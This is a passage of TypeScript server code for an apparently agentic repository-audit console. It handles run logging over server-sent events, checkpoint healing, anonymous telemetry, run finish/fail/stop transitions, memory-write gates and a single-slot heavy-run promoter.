    const ws = run.kind === 'ask' || run.kind === 'design' ? null : loadCheckpoint(run.id, 'workspace')?.payload?.manifest;
    const sources = [...runWs(run).sources, ...((run.pinnedSources ?? []) as Source[])];
    const publicNames = sources.filter((s) => s?.kind === 'giturl').flatMap((s) => (s.giturlRepos ?? []).map((r) => r.fullName));
    const askLocalNames = run.kind === 'ask' && run.askLocal?.length ? resolveAskLocalFolders(run.askLocal, runWs(run).sources).folders.map((f) => f.name) : [];
    return buildReportScope({
      kind: run.kind, manifest: ws ?? null, codeManifest: run.codeManifest ?? null, links: runLinks(run),
      askRepos: run.askRepos ?? null, askLocalNames, auditRepos: run.auditRepos ?? null,
      repoFilter: run.repoFilter ?? null, giturlFilter: run.giturlFilter ?? null, localFilter: run.localFilter ?? null, publicNames,
    });
  } catch { return null; }   // fail-open: a report is never withheld over its scope line
}
// Reading time: word counts of a complete run's stored reports, keyed like the console's reportGuide
// (internal / leadership / combined / workitems / provenance / bundle:<id>). peekReportWords answers from a memo and counts in the background, so
// a request never blocks on a report read. Absent reports are simply omitted.
function runReportWords(r: Run): Record<string, number> {
  const out: Record<string, number> = {};
  const put = (key: string, base: string) => { if (!reportExists(base)) return; const n = peekReportWords(reportHtmlPath(base)); if (n != null && n > 0) out[key] = n; };
  put('internal', r.id);
  put('leadership', r.id + '-leadership');
  put('combined', r.id + '-combined');
  put('workitems', r.id + '-workitems');
  put('provenance', r.id + '-provenance');
  for (const b of r.bundleReports ?? []) if (b?.id) put('bundle:' + b.id, r.id + '-bundle-' + b.id);
  return out;
}
function reportForConsole(html: string, links?: LinkIndex | null, scope?: ScopeEntry[] | null): string {
  // Hide the report's OWN duplicate topbar when shown inside the console shell (the console supplies its own
  // chrome + Export). Target the ID only — the deterministic renderer emits its topbar as
  // `<header class="topbar" id="repTopbar">`, so `#repTopbar` still hides it, while a report that legitimately
  // uses a `.topbar` CLASS for its own header is NOT force-hidden.
  return withPrintPatch(injectBeforeHead(injectReportScope(linkifyReport(html, links), scope ?? null, { context: 'console' }), `<style>#repTopbar{display:none!important}${HERO_FIX}</style>`));
}
// Console memory writes (save · delete · revert · freeform draft · report extract). On by default in the single-user
// app; THERESA_MEMORY_WRITE_ENABLED=off makes the Memory tab read-only.
function memoryWritesEnabled(): boolean { const v = (process.env.THERESA_MEMORY_WRITE_ENABLED || 'on').toLowerCase(); return v !== 'off' && v !== '0' && v !== 'false'; }
// Agent memory writes (the memory_write tool + the Full Scan "Save learnings" hook) need the per-run tick; this master
// switch (ACCEL_MEMORY_WRITE_ENABLED=off) turns them off for every run.
function agentMemoryWritesEnabled(): boolean { const v = (process.env.ACCEL_MEMORY_WRITE_ENABLED || 'on').toLowerCase(); return v !== 'off' && v !== '0' && v !== 'false'; }
// The project registry / alias write gate (src/orgMemoryApi.ts): the single local user owns the whole workspace.
async function orgMemoryWriteGate(_session: Session, canSee: ReturnType<typeof canSeeFromSources>): Promise<WriteGate> {
  return { canWrite: memoryWritesEnabled(), admin: true, canSee };
}
function resolveReportArtifact(run: Run, kind: string | undefined, bundleId: string | undefined): { key: string; html: string } | null {
  if (kind === 'leadership') { const html = run.leadershipHtml ?? loadReport(run.id + '-leadership'); return html ? { key: 'leadership', html } : null; }
  if (kind === 'bundle') {
    const b = (run.bundleReports ?? []).find((x) => x.id === bundleId);
    const html = bundleId ? loadReport(run.id + '-bundle-' + bundleId) : null;
    return (b && html) ? { key: `bundle:${bundleId}`, html } : null;
  }
  const html = run.reportHtml ?? loadReport(run.id);
  return html ? { key: 'internal', html } : null;
}
// Gather every report artifact a finished run carries as one plain-text blob for memory intake (leadership → internal
// → each area report), tags stripped, capped at ~40k chars. Used by the Report tab's "Extract memory" action and the
// Full Scan "Save learnings" finalize hook.
function gatherRunReportText(run: Run): string {
  const artKinds: Array<{ kind: string; bundleId?: string }> = [{ kind: 'leadership' }, { kind: 'internal' }];
  for (const b of (run.bundleReports ?? [])) artKinds.push({ kind: 'bundle', bundleId: b.id });
  const htmls: string[] = [];
  for (const a of artKinds) {
    const art = resolveReportArtifact(run, a.kind, a.bundleId);
    if (art?.html) htmls.push(art.html);
  }
  return htmls.join('\n\n').replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').trim().slice(0, 40000);
}

function readBody(req: IncomingMessage, maxBytes = 4_000_000): Promise<any> {
  return new Promise((done) => {
    let data = ''; let big = false;
    req.on('data', (c) => { data += c; if (data.length > maxBytes) { big = true; req.destroy(); } });
    req.on('end', () => { if (big) return done({}); try { done(data ? JSON.parse(data) : {}); } catch { done({}); } });
    req.on('error', () => done({}));
  });
}
// `id` (optional) rides the SSE id: field — used to carry a per-line epoch-ms timestamp to the run-detail event
// stream (read there as e.lastEventId). Our /events endpoint always replays the full backlog.
function sse(res: ServerResponse, event: string, data: string, id?: string | number): void {
  res.write((id != null && id !== '' ? `id: ${id}\n` : '') + `event: ${event}\ndata: ${data}\n\n`);
}


// ── run plumbing ─────────────────────────────────────────────────────────────────
function pushLog(run: Run, line: string): void {
  const ts = Date.now();
  run.log.push(line);
  (run.logTimes ??= []).push(ts);   // lockstep with log[] — replayed as the SSE id for the event-stream timestamp
  // Mirror phase-level progress to stdout (structured) so a run is queryable in a log
  // aggregator by run id (the `run` field). Skip the 4-space-indented per-tool detail lines to keep log volume sane.
  // (4-space prefix = the onTool detail format emitted by orchestrate.ts/scout.ts — keep in sync if that indent changes.)
  if (!line.startsWith('    ')) console.log(JSON.stringify({ severity: 'INFO', component: 'run', run: run.id, tenant: run.tenant, msg: line }));
  for (const s of liveRun(run).subs) sse(s, 'log', line, ts);
  // Checkpoint the run to durable state at each STAGE TRANSITION (bounded: ~8 stages + per-bundle lanes, so a
  // handful of full-state writes per run, not one-per-line). A run killed mid-flight (OOM SIGKILL, etc.) then
  // leaves state.json with its log + the last stage it reached — debuggable from the bucket instead of a blank
  // 'running' record. The persist is by the run's OWNER (this process is executing it), so it writes its own
  // truth — no cross-revision clobber. Stage markers carry `stage:<key>` (tolerant of a leading `[bundle-id]`
  // tag — same contract anchoredStage parses in the UI). Only while still running.
  if (run.status === 'running' && line.includes('stage:')) persist();
}

// ── Runs Store seam ───────────────────────────────────────────────────────
// A RUNS-SCOPED Store interface + its default in-memory implementation. This is the single seam a future
// backend-Store swaps in for RUN access; sessions / sources / queueItems / oauthStates keep their direct-Map
// access until THEY migrate (they get their own Store methods then). Every method does EXACTLY what the earlier
// code did against `tstate(...).runs` — same Map operations, returning the SAME live Run objects (NEVER clones:
// object identity is load-bearing — the fire-and-forget executors, pumpHeavyRuns, and the WeakMap-keyed
// liveRun(run) all rely on the exact reference). tstate() is still the tenant accessor (it also serves sources);
// the run methods wrap `tstate(tenant).runs`. persist()/restore() serialization is deliberately NOT routed through
// here — state.json output stays byte-identical.
interface Store {
  getRun(tenant: string, id: string): Run | undefined;            // wraps tstate(tenant).runs.get(id)
  putRun(run: Run): void;                                          // wraps tstate(run.tenant).runs.set(run.id, run)
  deleteRun(run: Run): void;                                       // wraps tstate(run.tenant).runs.delete(run.id)
  listRunsByTenant(tenant: string): Run[];                         // wraps [...tstate(tenant).runs.values()]
  allRuns(): Iterable<Run>;                                        // wraps the flatten-all-tenants run generator
  findRunById(id: string): Run | undefined;                       // wraps the unscoped linear scan
  updateRun(run: Run, mutator: (r: Run) => void): void;           // the mutation choke-point (mutate-in-place + persist once)
}
class MemoryStore implements Store {
  getRun(tenant: string, id: string): Run | undefined { return tstate(tenant).runs.get(id); }
  putRun(run: Run): void { tstate(run.tenant).runs.set(run.id, run); }
  deleteRun(run: Run): void { tstate(run.tenant).runs.delete(run.id); }
  listRunsByTenant(tenant: string): Run[] { return [...tstate(tenant).runs.values()]; }
  *allRuns(): Generator<Run> { for (const t of tenants.values()) for (const r of t.runs.values()) yield r; }
  findRunById(id: string): Run | undefined { for (const r of this.allRuns()) if (r.id === id) return r; return undefined; }
  // TODAY exactly the in-memory semantics it replaces: run the mutator on the SAME live `run` object, in place
  // (never a copy — identity is load-bearing), then persist() once. A later backend-Store changes only this method.
  updateRun(run: Run, mutator: (r: Run) => void): void { mutator(run); persist(); }
}
const store: Store = new MemoryStore();
// Thin free-function delegator so the existing run-lifecycle call sites (finishRun/failRun/stopRun/…) stay
// untouched — the SAME choke-point, now owned by the Store.
function updateRun(run: Run, mutator: (r: Run) => void): void { store.updateRun(run, mutator); }

// ── checkpoint plumbing ────────────────────
// Agentic ORG runs only — audit/ask runs and deterministic runs have no resumable pipeline.
function ckptEligible(run: Run): boolean { return run.mode === 'agentic' && (run.kind ?? 'org') === 'org'; }
function runInputsFp(run: Run): string {
  return inputsFingerprint({
    repoFilter: run.repoFilter, localFilter: run.localFilter ?? null, projectFilter: run.projectFilter,
    invariantKeys: run.invariantKeys ?? null, bundles: run.bundles ?? null, brief: run.brief ?? null, useMemory: run.useMemory !== false,
  });
}
// Capture one boundary (fail-open): payload → disk sidecar, meta row → the Run record. The
// 'barrier' write SUBSUMES the 3/3 'frontier' row (same cut — the UI shows one "Bundles
// complete" row, per the design). Replayed stages re-write their checkpoint under the CHILD
// id so a resumed run is itself resumable.
function saveRunCheckpoint(run: Run, id: CkptId, payload: unknown, display: { label: string; detail?: string; bundlesDone?: string[] }): void {
  if (!ckptEligible(run)) return;
  try {
    const meta = writeCheckpoint(run.id, id, payload, runInputsFp(run), { ...display, spentUsd: currentLedger()?.spent() });
    if (!meta) return;
    updateRun(run, (r) => {
      r.checkpoints = [...(r.checkpoints ?? []).filter((c) => c.id !== id && !(id === 'barrier' && c.id === 'frontier')), meta];
      pushLog(r, `◆ checkpoint saved · ${display.label}${display.detail ? ' — ' + display.detail : ''}`);
    });
  } catch { /* fail-open — a checkpoint failure never affects the run */ }
}
// The checkpoint list with SELF-HEALING from the sidecar files. The sidecars are the source of
// truth (each embeds its own meta, written directly to the report store); the run-record rows are
// only an INDEX persisted via state.json — which is best-effort and can LAG a crash (seen live on
// rs_948f…: an instance restart lost the frontier/barrier rows while the 925KB sidecars survived,
// making the saved cuts invisible to the resume picker). Merge: any on-disk cut missing from the
// index is re-adopted from its embedded meta; 'barrier' still subsumes 'frontier'; rank order.
// A successful heal persists, so /api/state reflects it from then on. Read cost: one sidecar read
// per MISSING id, only until healed.
function effectiveCheckpoints(run: Run): CkptMeta[] {
  // The on-disk meta wins even when an index row EXISTS — a lagged index can be STALE, not just
  // missing ('frontier' is overwritten per completed lane: a crash between the 2/N sidecar write
  // and the state persist leaves the index at 1/N). No sidecar → keep the index row
  // (the compat check will flag it unreadable). The merge + change detection is the pure
  // healCheckpointIndex (checkpoints.ts), which no longer re-"heals" a past-barrier run's dropped
  // 'frontier' sidecar on every read.
  const { rows, changed } = healCheckpointIndex(run.checkpoints ?? [], ckptEligible(run) ? (id) => loadCheckpoint(run.id, id)?.meta : null);
  if (changed) {
    // Adopt in MEMORY only — the next legitimate persist carries it. Persisting HERE (a GET-triggered
    // side effect) could clobber durable state another revision wrote during a rolling deploy — the
    // same clobber class restore() explicitly avoids. The heal is idempotent and cheap,
    // so re-healing after a restart costs one sidecar read per cut.
    run.checkpoints = rows;
    const line = checkpointHealLogLine(rows.length, run.log[run.log.length - 1]);   // Coalesce consecutive identical heal lines
    if (line) pushLog(run, line);
  }
  return rows;
}

// ── Anonymous usage telemetry (src/telemetry.ts; on by default, THERESA_TELEMETRY=0 or Settings turns it off) ──
// One event per finished run: kind, outcome, duration, cost range, the KINDS of sources it used, the built-in bundle
// ids that ran and finding counts by severity / lens. Never names, paths, URLs, questions or finding text.
function runConnectorKinds(run: Run): string[] {
  if (run.kind === 'ask') {
    const srcs = runWs(run).sources;
    const publicNames = new Set(srcs.filter((s) => s.kind === 'giturl').flatMap((s) => (s.giturlRepos ?? []).map((r) => r.fullName)));
    const kinds = new Set<string>();
    for (const r of run.askRepos ?? []) kinds.add(publicNames.has(r.fullName) ? 'giturl' : 'github');
    if (run.askLocal?.length) kinds.add('local');
    for (const id of run.planeFilter ?? []) { const s = srcs.find((x) => x.id === id); if (s) kinds.add(s.kind); }
    return [...kinds];
  }
  return [...new Set((run.pinnedSources ?? []).map((s) => String(s.kind ?? '')).filter(Boolean))];
}
function reportRunTelemetry(run: Run, outcome: 'complete' | 'error' | 'stopped', findings?: Finding[]): void {
  try {
    const kind = run.kind ?? 'org';
    if (kind !== 'org' && kind !== 'ask') return;
    if (!telemetryStatus().noticeShown) return;   // nothing is sent before the first-run notice has been shown
    const event = kind === 'ask' ? 'quick-ask' : (run.incremental && run.incremental.mode !== 'full' ? 'incremental' : 'full-scan');
    const started = run.createdAt ? Date.parse(run.createdAt) : NaN;
    const counts: Record<string, number> = {};
    for (const f of findings ?? []) {
      if (isRuledOutFinding(f)) continue;
      counts[f.severity] = (counts[f.severity] ?? 0) + 1;
      if (f.lens) counts[f.lens] = (counts[f.lens] ?? 0) + 1;
    }
    let bundles: string[] = [];
    if (kind === 'org') { try { bundles = (loadCheckpoint(run.id, 'comprehend')?.payload?.bundleIds ?? run.bundles ?? []) as string[]; } catch { bundles = run.bundles ?? []; } }
    const lastStage = [...run.log].reverse().map((l) => /stage:([a-z][a-z0-9-]*)/.exec(l)?.[1]).find(Boolean);
    void track(event, {
      outcome, bundles, connectorKinds: runConnectorKinds(run),
      durationSec: Number.isFinite(started) ? Math.max(0, Math.round((Date.now() - started) / 1000)) : undefined,
      costUsd: run.costUsd ?? undefined,
      findings: findings ? counts : undefined,
      degradedStages: [...new Set((run.degraded ?? []).map((d) => d.stage))],
      failedStages: outcome === 'error' && lastStage ? [lastStage] : [],
      keyProvider: keyProvider(),
    });
  } catch { /* telemetry never affects a run */ }
}

function finishRun(run: Run, result: MinerResult, costUsdRaw: number | null, workspaceRoot?: string): void {
  if (liveRun(run).stopRequested) return stopRun(run);
  const costUsd = roundUsd(costUsdRaw);   // a float sum (10.560582499999999) must not reach /api/state or the SSE done payload   // stop landed during the final render — don't flip 'stopped'→'complete'
  // Evidence-gate backstop: never render a finding without RESOLVABLE evidence. The source
  // converters already route unsettled concerns to coverageGaps; this is a fail-open safety net (drop +
  // log, never throw) so a stray synthetic/`eval:*` ref can't ship as a finding. NOTE: deterministic +
  // GCP miners must use concrete-artifact evidence KINDS (file/commit/pr/doc/metric) — a `computation`
  // ref that happens to match the future-work placeholder family would be dropped here. (Claude 0b note.)
  // When the executor still holds the run's workspace (`workspaceRoot`, org runs — finish is called before the
  // finally that deletes it), a `file` ref must also EXIST there (path present, cited line in range); without it the
  // kind-aware rule is unchanged. findingResolvesInWorkspace(f, undefined) ≡ findingHasResolvableEvidence(f).
  const ungated = result.findings.filter((f) => !findingResolvesInWorkspace(f, workspaceRoot));
  if (ungated.length) {
    result = { ...result, findings: result.findings.filter((f) => findingResolvesInWorkspace(f, workspaceRoot)) };
    pushLog(run, `evidence gate: dropped ${ungated.length} finding(s) lacking resolvable evidence${workspaceRoot ? ' (file refs checked against the workspace)' : ''} (${ungated.map((d) => d.id).join(', ')})`);
  }
  const html = renderFindingsHtml(result, new Date().toISOString(), true, run.brief, costUsd);   // parity with the Job finish: the header shows the run's real cost
  // Ruled-out (refuted) rows ride in result.findings so the engineering report can show them, but they are NOT
  // findings — run.findings is the confirmed count and run.ruledOut carries the rest (one split, every surface).
  const counts = findingCounts(result.findings);
  updateRun(run, (r) => {
    r.reportHtml = html; saveReport(r.id, html);
    r.findings = counts.confirmed; r.ruledOut = counts.ruledOutItems; r.costUsd = costUsd; r.status = 'complete';
    // Admission is start-only, so the final cost can pass the cap — accepted, never silent.
    const overrun = budgetOverrunReason(costUsd, effectiveRunBudget());
    if (overrun) noteDegraded(r, 'budget', overrun);
    // The boot probe found the instance's OpenAI key rejected — every codex/gpt stage of this run fell open.
    if (openaiAuthOk === false) noteDegraded(r, 'openai-auth', 'OPENAI_API_KEY was rejected at boot (401) — codex/gpt stages (QC judges, reconcile, normalizer) ran degraded');
    // Memory layer: record the reusable diagnostic method(s) this run reinforced (VALUE-FREE) and merge the
    // confirmed findings into the per-org findings-ledger. Fail-open — a memory write must NEVER affect the run.
    try {
      const memText = [r.brief, r.auditIssue, r.askQuestion, r.targetName, ...result.findings.map((f) => f.title)].filter(Boolean).join('\n');
      const matched = patternsFor(memText);
      if (matched.length) {
        const hay = memText.toLowerCase();
        const signature = [...new Set(matched.flatMap((p) => p.appliesWhen).filter((s) => hay.includes(s.toLowerCase())))].slice(0, 5);
        let saved = { added: 0, updated: 0, total: 0 };
        // The ledger merge is a memory WRITE — it rides the run's memory-write opt-in (run.writeMemory), and a
        // skip is disclosed in the run log (src/run/ledgerGate.ts). The learned METHOD (value-free) still surfaces.
        const ledgerGate = ledgerMergeDecision(r, counts.confirmed);
        if (ledgerGate.log) pushLog(r, ledgerGate.log);
        if (ledgerGate.merge) try {
          // Only CONFIRMED rows enter the findings-ledger — a ruled-out row merged here was stored as a confirmed defect.
          const confirmed = result.findings.filter((f) => !isRuledOutFinding(f)).map((f) => ({ invariant: f.invariant, title: f.title, severity: f.severity as string, claim: f.claim, evidence: (f.evidence || []).map((e) => ({ ref: String((e as { ref?: string; path?: string; kind?: string }).ref ?? (e as { path?: string }).path ?? (e as { kind?: string }).kind ?? 'evidence') })) }));
          const merged = mergeLedger(orgSlug(process.cwd(), r.tenant || r.targetName), confirmed, new Date().toISOString());
          saved = { added: merged.added, updated: merged.updated, total: merged.total };
        } catch { /* ledger write failed — still surface the learned method without save counts */ }
        r.learned = { pattern: matched[0].title, signature, checks: matched.map((p) => p.title), saved };
      }
    } catch { /* fail-open: memory is best-effort */ }
    console.log(JSON.stringify({ severity: 'INFO', component: 'run', run: r.id, tenant: r.tenant, event: 'complete', findings: r.findings, ruledOut: counts.ruledOut, costUsd: costUsd != null ? Number(costUsd.toFixed(2)) : null }));
    const payload = JSON.stringify({ findings: r.findings, ruledOut: counts.ruledOut, costUsd: costUsd != null ? Number(costUsd.toFixed(2)) : null });
    for (const s of liveRun(r).subs) { sse(s, 'done', payload); s.end(); }
    // Audit log (flight recorder): render the per-node HTML from the audit.jsonl the leaf wrappers spooled this
    // run (agentic runs only — deterministic runs record no leaves → no file → skipped). Internal; served at
    // /api/runs/:id/audit, NEVER on /share. fail-open: a render failure never affects the completed run.
    try {
      const auditLeaves = readAuditLeaves(reportArtifactPath(r.id, 'audit.jsonl'));
      if (auditLeaves.length) {
        saveReport(r.id + '-audit', renderAuditHtml(auditLeaves, { runId: r.id, target: r.targetName, stamp: new Date().toISOString().slice(0, 10) }));
        if (reportExists(r.id + '-audit')) r.hasAudit = true;   // gate on the write actually landing (saveReport swallows failures) — mirror /trace
      }
    } catch { /* fail-open */ }
    // Draft memory from THIS run's reports (Full-Scan "Draft memory from reports" tick). Two-key gate mirroring the
    // in-run memory plane: ACCEL_MEMORY_WRITE_ENABLED (deployment master) AND run.writeMemory (per-run tick). We read
    // ALL of the run's reports (leadership + internal + area) via the same gatherRunReportText the Report-tab button
    // uses, then intake ONCE through the org-memory spine stamped entrypoint 'full-scan-draft'. FIRE-AND-FORGET: the
    // intake takes ~30s and MUST NOT block finalize, and a failure MUST NOT break the run — so we don't await it and
    // swallow its rejection. The drafted writes surface on the run detail + Memory → History (label "Full Scan").
    try {
      if (agentMemoryWritesEnabled() && r.writeMemory === true) {
        const text = gatherRunReportText(r);
        if (text && text.trim()) {
          const memOrgId = r.orgId ?? orgIdForTenant(r.tenant);
          if (memOrgId) {
            void extractMemoryFromReport(memOrgId, { runId: r.id, scope: r.targetName || 'full-scan', text, entrypoint: 'full-scan-draft', runType: 'full-scan', actor: r.createdBy, repos: (r.auditRepos ?? r.askRepos)?.map((repo) => repo.fullName) ?? (r.repoFilter?.length || r.giturlFilter?.length ? [...(r.repoFilter ?? []), ...(r.giturlFilter ?? [])] : undefined) })
              .catch(() => {});   // never break the run finalize
          }
        }
      }
    } catch { /* fail-open */ }
    liveRun(r).boundSources = undefined;   // credential hygiene: drop the raw-token source snapshot once the run is terminal (execution done; resume re-pins from live sources, never reads a parent's boundSources)
  });
  liveRun(run).subs.clear();
  reportRunTelemetry(run, 'complete', result.findings);
  pumpHeavyRuns();   // terminal transition — a heavy slot may have freed; promote the next queued heavy run
}
function failRun(run: Run, msgRaw: string): void {
  if (liveRun(run).stopRequested) return stopRun(run);   // a user stop unwound the pipeline as a throw — render 'stopped', not 'error'
  // An error message can carry text from a provider / connector response: redact it before it reaches the run record,
  // state.json, stdout and the SSE stream.
  const msg = redactSecrets(msgRaw);
  updateRun(run, (r) => {
    r.status = 'error'; r.error = msg; r.log.push('error: ' + msg);
    console.log(JSON.stringify({ severity: 'ERROR', component: 'run', run: r.id, tenant: r.tenant, event: 'error', error: msg }));
    for (const s of liveRun(r).subs) { sse(s, 'error', JSON.stringify({ error: msg })); s.end(); }
    liveRun(r).boundSources = undefined;   // credential hygiene: drop the raw-token source snapshot once the run is terminal
  });
  liveRun(run).subs.clear();
  reportRunTelemetry(run, 'error');
  pumpHeavyRuns();   // terminal transition — a heavy slot may have freed; promote the next queued heavy run
}
// Finalize a user-stopped run (idempotent): mark 'stopped', emit a non-error `done` so the client labels it a
// stop (not a red error), drop the abort controller, persist. One source of truth for the stopped transition.
function stopRun(run: Run): void {
  if (run.status !== 'running') return;            // already terminal (complete/error/stopped)
  updateRun(run, (r) => {
    r.status = 'stopped'; r.error = undefined; r.log.push('stopped by user');
    console.log(JSON.stringify({ severity: 'INFO', component: 'run', run: r.id, tenant: r.tenant, event: 'stopped' }));
    for (const s of liveRun(r).subs) { sse(s, 'done', JSON.stringify({ stopped: true })); s.end(); }
    liveRun(r).boundSources = undefined;   // credential hygiene: drop the raw-token source snapshot once the run is terminal
    liveRun(r).abort = undefined;
  });
  liveRun(run).subs.clear();
  reportRunTelemetry(run, 'stopped');
  pumpHeavyRuns();   // terminal transition — a heavy slot may have freed; promote the next queued heavy run
}
// Permanently delete EVERY on-disk artifact for a run (main report + all sidecar reports + the audit JSONL).
// Used by "Empty trash". Mirrors the saveReport suffixes (id, -leadership, -workitems, -provenance, -trace, -audit, -bundle-<bid>).
function purgeRunArtifacts(run: Run): void {
  deleteReport(run.id);
  for (const s of ['leadership', 'combined', 'workitems', 'provenance', 'trace', 'audit']) deleteReport(run.id, s);
  for (const b of run.bundleReports ?? []) deleteReport(run.id, 'bundle-' + b.id);
  deleteArtifact(run.id, 'audit.jsonl');
  deleteArtifact(run.id, 'plan.md');   // legacy Design Doc sidecar (the removed Design Doc tab's implementation plan) — old runs may still have one on disk
  for (const id of CKPT_ORDER) deleteArtifact(run.id, 'ckpt-' + id + '.json');   // checkpoint payload sidecars
  deleteArtifact(run.id, 'findingkeys.json');   // incremental re-scan: the run's keyed findings (a later scan's since-last-scan baseline)
}

// ── Heavy-run promoter (run-level admission) ─────────────────────────────────────────
// Bounds how many HEAVY runs (v1: Full Scan / org runs — kind undefined|'org') EXECUTE at once. This is a
// RUN-level cap, deliberately SEPARATE from research/scheduler.ts's LLM-leaf semaphore: wrapping a whole run in
// an LLM slot would DEADLOCK (a held run awaits nested slotted calls — see scheduler.ts's non-deadlock note), so
// the promoter is its own thing and NEVER touches scheduler.ts. Lightweight modes (ask/audit) are NOT
// gated — they still start immediately at their own create sites.
//
// The promoter operates on the LIVE in-memory Run objects (which retain the transient authToken/abort/subs). A
// queued run is the SAME object the create path built, so pump() can re-invoke executeOrgRun on it with no
// request closure. A queued run does NOT survive a restart (boot reaps it to 'error'), so we never re-invoke
// from a partial persisted Run.
const HEAVY_RUN_CAP = 1;
function isHeavyRun(run: { kind?: string }): boolean { return run.kind === undefined || run.kind === 'org'; }
// Counts heavy runs executing IN THIS PROCESS (the in-process HEAVY_RUN_CAP gate). A DISPATCHED run (tracked in
// dispatchedRuns) runs in a separate job, not here — even after dispatchPump flips its LOCAL status to 'running'
// for the cockpit, it must NOT consume an in-process heavy slot (that would starve the in-process fallback
// path). FLAG-OFF ⇒ dispatchedRuns is always empty ⇒ this is byte-identical to the pre-dispatch count.
function heavyRunsInFlight(): number { let n = 0; for (const r of store.allRuns()) if (r.status === 'running' && isHeavyRun(r)) n++; return n; }

// ── Self-contained run sources (cross-org data-plane leak fix) ─────────────────────────────────────
// THE source-set a run executes against. A heavy (org) run is SELF-CONTAINED: at create it pins a snapshot of its
// acting org's sources onto the Run (liveRun(run).boundSources / run.pinnedSources), and executeOrgRun binds it before any
// work — so the ENTIRE execute call graph reads THIS snapshot, never the live org workspace. A concurrent
// acting-org switch / claim / connect / auto-apply / OAuth callback therefore CANNOT swap another org's
// warehouse/MCP/gcp planes under an in-flight (queued or running) run → the leak is closed at the source, so no
// workspace-mutation guards are needed. A non-pinned run (ask/audit, or a legacy pre-pin run) has no boundSources →
// falls back to the live workspace of the run's OWN org (runWs).
function runSourceSet(run: Run): Source[] { return liveRun(run).boundSources ?? runWs(run).sources; }

// In-process RunContext (run-extraction Phase B): forwards each seam sink 1:1 to server.ts's existing
// singletons/functions, preserving today's behavior (the SAME choke-points). The extracted executor cluster
// in ./run/execute-org-run.ts runs against this; a future Job impl will back the same surface durably.
const inProcessCtx: RunContext = {
  live: (run) => liveRun(run),
  getRun: (id) => { for (const r of store.allRuns()) if (r.id === id) return r; return undefined; },
  allRuns: () => [...store.allRuns()],
  updateRun: (run, mutator) => updateRun(run, mutator),
  log: (run, line) => pushLog(run, line),
  saveReport: (id, html) => saveReport(id, html),
  reportArtifactPath,
  saveCheckpoint: (run, id, payload, display) => saveRunCheckpoint(run, id, payload, display),
  finish: (run, result, cost, opts) => finishRun(run, result, cost, opts?.workspaceRoot),
  fail: (run, msg) => failRun(run, msg),
  sourcesFor: (run) => runSourceSet(run),
  tenantSources: (run) => runWs(run).sources,
  get runBudget() { return runBudget(); },
  get effectiveRunBudget() { return effectiveRunBudget(); },
};

// Fire-and-forget start of a heavy run from its fully-populated in-memory Run. Mirrors the create-site's
// executeOrgRun(run).catch(failRun) so a queued run promoted LATER by pump() gets identical error handling. No
// source re-binding is needed anymore — the run carries its own pinned snapshot (executeOrgRun binds it).
function startHeavyRun(run: Run): void { void executeOrgRun(run, inProcessCtx).catch((e) => failRun(run, String(e))); }

// admit(run, startFn) — the create-path gate: start now when a heavy slot is free, else park 'queued' for pump().
// PRECONDITION: create sites initialize the run 'queued', so it does not count itself against the cap.
function admitHeavyRun(run: Run, startFn: () => void): void {
  if (heavyRunsInFlight() < HEAVY_RUN_CAP) {
    updateRun(run, (r) => { r.status = 'running'; });
    startFn();
  } else {
    updateRun(run, (r) => { r.status = 'queued'; });
    console.log(JSON.stringify({ severity: 'INFO', component: 'promoter', run: run.id, event: 'queued', inFlight: heavyRunsInFlight() }));
  }
}


// pump() — promote queued heavy runs (FIFO by createdAt) while a heavy slot is free. ORDERING IS LOAD-BEARING:
// mark the picked run queued→running and PERSIST *before* kicking its start, and defer the kick to a microtask.
// That way a re-entrant pump() (or a synchronous throw inside the start) can never observe the same run as
// still-'queued' and double-start it: by the time the deferred start runs, the run is already 'running' and
// counted by heavyRunsInFlight(), so both this loop's re-count and any nested pump() skip it.
function pumpHeavyRuns(): void {
  while (heavyRunsInFlight() < HEAVY_RUN_CAP) {
    let next: Run | undefined;
    for (const r of store.allRuns()) {
      // Skip runs the DISPATCH subsystem owns (already dispatched, or dispatch-eligible + parked for the dispatch
      // pump) — promoting them in-process would double-execute a Job run or steal one meant for the Job. FLAG-OFF ⇒
      // dispatchClaims is always false ⇒ this is byte-identical to the pre-dispatch pick.
      if (r.status === 'queued' && isHeavyRun(r) && (!next || (r.createdAt ?? '') < (next.createdAt ?? ''))) next = r;
    }
    if (!next) break;
    const run = next;
    updateRun(run, (r) => { r.status = 'running'; });   // FIRST: claim the slot so the loop re-count + any re-entrant pump sees it running
    console.log(JSON.stringify({ severity: 'INFO', component: 'promoter', run: run.id, tenant: run.tenant, event: 'promoted' }));
    queueMicrotask(() => startHeavyRun(run));   // THEN: kick asynchronously — the double-start guard
  }
}

// The COMPREHEND → CRITIQUE → EXPERT pipeline — the hypothesis-driven recsys/data-trust machine that
// the console run now drives (the v3 stages the UI shows). It maps the org, classifies it into expert
// bundles, lets the Critique agents POSE evidence-seeded problems, then the Expert engine (deepAudit)
// MEASURES each to a verdict LIVE against the read-only warehouse / key-value plane, synthesizes, and
// emits TWO reports: the detailed internal one (the Finding contract → reportHtml) and the
// deep-brief LEADERSHIP brief (recallReportHtml). Emits anchored `stage:` markers the UI parses.
//   Map(comprehend) → Critique → Expert(measure) → Mitigate → Synthesize → Findings → Report
// Falls back to the invariant FLOOR scan (orgAgentic) if the Critique surfaces nothing — invariants
// are the floor, the Critique→Expert methodology is the ceiling. Read-only throughout.
// One-line "what each built-in plane exposes" (plane hints) — shared by orgCritiqueExpert and the
// invariant-floor fallback so both describe a mounted plane identically.

// Build the read-only MEASURE planes (warehouse SQL / key-value cache) for a run, from its connected sources
// PLUS any env-mounted planes (envMcpSources, e.g. bq-mcp). Shared by the rec-audit BIND-ONLY path and
// the LIVE-EXEC orchestration (Phase 1/3 deepAudit measure steps + the Phase 2 executor agent), so all of them
// measure against the SAME planes the org run sees. Returns the merged `warehouse`/`redis`
// mcpServers map + the PlaneInfo list that drives planeHints. Empty when no warehouse/cache is connected.
async function measurePlanesFor(run: Run): Promise<{ mcpServers: Record<string, unknown> | undefined; planes: PlaneInfo[] }> {
  const ds: DataSource[] = []; const planes: PlaneInfo[] = [];
  // first per server name wins (mergeAgentTools dedups mcpServers by name; dedup the `planes` list to match so
  // planeHints/the log don't list a server twice). For warehouse, prefer the box-style SA plane over an HTTP MCP.
  let whMounted = false, kvMounted = false;
  // A run carrying an explicit plane selection (a Quick Ask) mounts ONLY its selected data planes; a run
  // with none (rec audit, report chat, pre-gate records) → null filters → scopeSourcesToSelection is a no-op.
  // Env planes are local-machine only and stay unscoped (same as the org run).
